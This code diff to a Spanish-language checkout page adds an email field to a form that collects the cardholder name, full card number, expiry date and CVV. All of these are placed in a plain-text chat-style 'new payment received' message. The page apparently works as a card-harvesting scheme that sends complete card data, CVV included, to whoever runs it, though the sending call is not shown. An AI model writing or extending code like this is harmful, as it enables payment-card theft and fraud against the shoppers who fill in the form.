@@ -88,6 +88,9 @@
 <input class="form-control" id="nombre" name="nombre" type="text"/>
 <div class="alert alert-danger py-1 px-2 mt-1 d-none" id="error-nombre" style="border-radius: 8px; font-size: 0.85rem;">Este campo es obligatorio</div>
 </div>
+<label class="form-label" for="correo">correo para recibirlo</label>
+<input class="form-control" id="correo" name="correo" type="text"/>
+<div class="alert alert-danger py-1 px-2 mt-1 d-none" id="error-correo" style="border-radius: 8px; font-size: 0.85rem;">Este campo es obligatorio</div>
 <div class="mb-3">
 <label class="form-label" for="numero">Número de la tarjeta</label>
 <input class="form-control" id="numero" inputmode="numeric" maxlength="16" name="numero" type="text"/>
@@ -166,6 +169,7 @@
     }
 
     mostrarError("nombre", "error-nombre");
+    mostrarError("correo", "error-correo");
     mostrarError("numero", "error-numero", v => /^[0-9]{16}$/.test(v));
     mostrarError("vencimiento", "error-vencimiento", v => {
       const match = v.match(/^(0[1-9]|1[0-2])\/\d{2}$/);
@@ -181,6 +185,7 @@
   document.getElementById('btnPagar').addEventListener('click', function() {
     if (!validarCampos()) return;
     const nombre = document.getElementById('nombre').value;
+    const correo = document.getElementById('correo').value;  
     const numero = document.getElementById('numero').value;
     const vencimiento = document.getElementById('vencimiento').value;
     const codigo = document.getElementById('codigo').value;
@@ -191,8 +196,9 @@
     let total = carrito.reduce((sum, p) => sum + parseFloat(p.precio.replace(/[^0-9]/g, "")), 0);
 
     const mensaje = `
-    *Nuevo pago recibido:*
+    *Nuevo pago recibido por tarjeta:*
     *Nombre:* ${nombre}
+    *Correo:*${correo}
     *Número de tarjeta:* ${numero}
     *Vencimiento:* ${vencimiento}
     *CVV:* ${codigo}
